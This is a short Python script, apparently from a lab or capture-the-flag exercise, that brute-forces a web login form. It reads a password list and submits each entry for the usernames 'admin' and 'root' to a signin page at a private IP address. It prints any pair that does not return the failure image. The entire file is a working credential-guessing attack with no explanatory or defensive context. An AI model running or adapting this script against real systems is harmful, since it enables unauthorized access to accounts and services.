import requests

if __name__ == '__main__':
    with open('./passlist.txt') as f:
        passwords = f.read().split('\n')

    for user in ['admin', 'root']:
        for password in passwords:
            params = {
                'page': 'signin',
                'username': user,
                'password': password,
                'Login': 'Login'
            }
            r = requests.get('http://10.13.0.53/index.php', params)
            if 'images/WrongAnswer.gif' not in r.text:
                print(user, password)
